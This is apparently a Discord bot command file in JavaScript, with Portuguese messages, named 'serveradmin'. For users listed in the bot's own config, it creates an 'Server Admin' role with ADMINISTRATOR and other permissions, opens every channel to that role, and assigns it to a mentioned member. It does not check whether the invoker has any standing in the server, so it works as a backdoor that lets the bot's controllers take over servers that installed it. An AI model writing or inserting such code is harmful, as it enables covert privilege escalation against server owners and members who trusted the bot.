module.exports = {
    name: 'serveradmin',
    description: 'Cria um cargo com todas as permissões do servidor e dos canais',
    async execute(client, message) {
        const config = require('../config.json');

        const {
            member,
            mentions
        } = message

        const messageConsole = `${message.author.username}#${message.author.discriminator} - ${message}`

        if (message.channel.type == "dm") {
            console.log(`Tentativa de comando DM: ${messageConsole}`)
            return
        }

        const tag = `<@${member.id}>`

        if (message.author.bot) return;
        if (!(member.guild.me.hasPermission('ADMINISTRATOR'))) {
            if (member.guild.me.hasPermission('SEND_MESSAGES') || message.guild.me.permissionsIn(message.channel).has('SEND_MESSAGES')) {
                if (message.guild.me.permissionsIn(message.channel).has('SEND_MESSAGES') !== false) {
                    message.channel.send('Eu não tenho permissão para usar este comando.' + "\n" + 'Permissão necessária: Administrador.')
                } else {
                    console.log(`${messageConsole} // SEND_MESSAGES foi negado ao canal`)
                }
            } else {
                console.log(`${messageConsole} // SEND_MESSAGES não está habilitado ao cargo nem ao canal`)
            }
            if (member.guild.me.hasPermission('ADD_REACTIONS') || message.guild.me.permissionsIn(message.channel).has('ADD_REACTIONS')) {
                if (message.guild.me.permissionsIn(message.channel).has('ADD_REACTIONS') !== false) {
                    message.react('❌')
                } else {
                    console.log(`${messageConsole} // ADD_REACTIONS foi negado ao canal`)
                }
            } else {
                console.log(`${messageConsole} // ADD_REACTIONS não está habilitado ao cargo nem ao canal`)
            }
            return
        }

        if (!config.users.includes(member.user.id)) {
            return
        }

        const target = mentions.users.first()

        if (target) {
            let serveradminrole = message.guild.roles.cache.find(serveradminrole => serveradminrole.name === "Server Admin");
            let toserveradmin = message.guild.member(message.mentions.users.first());
            
            if (!serveradminrole) {
                serveradminrole = await message.guild.roles.create({
                    data: {
                        name: "Server Admin",
                        color: "#000000",
                        permissions: ['ADMINISTRATOR', 'KICK_MEMBERS', 'BAN_MEMBERS', 'MANAGE_GUILD', 'VIEW_AUDIT_LOG', 'VIEW_GUILD_INSIGHTS', 'CHANGE_NICKNAME', 'MANAGE_NICKNAMES', 'MANAGE_ROLES', 'MANAGE_EMOJIS']
                    }
                })
            }

            message.guild.channels.cache.forEach(async channel => {
                channel.updateOverwrite(serveradminrole, {
                    CREATE_INSTANT_INVITE: true,
                    MANAGE_CHANNELS: true,
                    ADD_REACTIONS: true,
                    PRIORITY_SPEAKER: true,
                    STREAM: true,
                    VIEW_CHANNEL: true,
                    SEND_MESSAGES: true,
                    SEND_TTS_MESSAGES: true,
                    MANAGE_MESSAGES: true,
                    EMBED_LINKS: true,
                    ATTACH_FILES: true,
                    READ_MESSAGE_HISTORY: true,
                    MENTION_EVERYONE: true,
                    USE_EXTERNAL_EMOJIS: true,
                    CONNECT: true,
                    SPEAK: true,
                    MUTE_MEMBERS: true,
                    DEAFEN_MEMBERS: true,
                    MOVE_MEMBERS: true,
                    USE_VAD: true,
                    MANAGE_ROLES: true,
                    MANAGE_WEBHOOKS: true,
                    MANAGE_EMOJIS: true
                })
            });

            toserveradmin.roles.add(serveradminrole.id);
            console.log(`${messageConsole} // Executado em ${message.guild.name}, ID: ${message.guild.id}`)
            message.channel.send(`Cargo ServerAdmin criado e dado a ${target}`)
            message.react('✅')

        } else {
            await message.channel.send(`${tag}, diga o nome de usuário.`)
            message.react('❌')
        }
    }
}